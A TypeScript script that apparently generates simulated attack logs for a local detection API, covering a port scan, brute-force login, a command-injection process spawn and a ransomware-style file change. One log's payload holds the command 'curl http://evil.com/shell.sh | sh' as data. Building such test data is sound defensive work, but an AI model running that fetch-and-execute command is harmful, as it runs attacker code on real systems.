import axios from 'axios';

const API_URL = 'http://localhost:3000/api/logs';

async function injectLog(data: any) {
    try {
        const payload = {
            timestamp: new Date().toISOString(),
            ...data
        };
        await axios.post(API_URL, payload);
        console.log(`[+] Injected Log: ${data.event_type} - ${data.source_ip}`);
    } catch (e: any) {
        console.error(`[-] Failed to inject log: ${e.message}`);
    }
}

// 1. Chained Vulnerability Simulation
async function simulateChainedAttack() {
    console.log("=== Starting Chained Vulnerability Simulation ===");
    const attackerIP = "45.133.1.22";
    
    // Step 1: Recon (Port Scan)
    await injectLog({
        source_ip: attackerIP,
        event_type: "network_connection",
        username: "unknown",
        payload: { "port_scan": true, "ports_probed": [22, 80, 443, 3306], "user_agent": "Nmap" },
        status_code: 403
    });
    
    await new Promise(r => setTimeout(r, 2000));
    
    // Step 2: Failed Auth -> Exploitation
    await injectLog({
        source_ip: attackerIP,
        event_type: "auth_failed",
        username: "admin",
        payload: { "method": "brute_force", "attempts": 15 },
        status_code: 401
    });

    await new Promise(r => setTimeout(r, 2000));
    
    // Step 3: Command Injection / Process Spawn
    await injectLog({
        source_ip: attackerIP,
        event_type: "process_creation",
        username: "www-data",
        payload: { "command": "bash -c 'curl http://evil.com/shell.sh | sh'", "parent_process": "nginx" },
        status_code: 200
    });
}

// 2. Encrypted Zero-Day/Ransomware Simulation
async function simulateRansomware() {
    console.log("=== Starting Ransomware Zero-Day Simulation ===");
    const attackerIP = "104.22.3.11";
    
    await injectLog({
        source_ip: attackerIP,
        event_type: "file_modification",
        username: "system",
        payload: {
            "file": "database.db",
            "entropy": 7.9,
            "signature": "unknown",
            "content": "U2FsdGVkX19O/WpTXYl+q2a/m78r8/zH38D1M+k9w2PqR1p4O8X7qP4..."
        },
        status_code: 200
    });
}

async function run() {
    await simulateChainedAttack();
    console.log("Waiting before next simulation...");
    await new Promise(r => setTimeout(r, 5000));
    await simulateRansomware();
    console.log("Done.");
}

run();
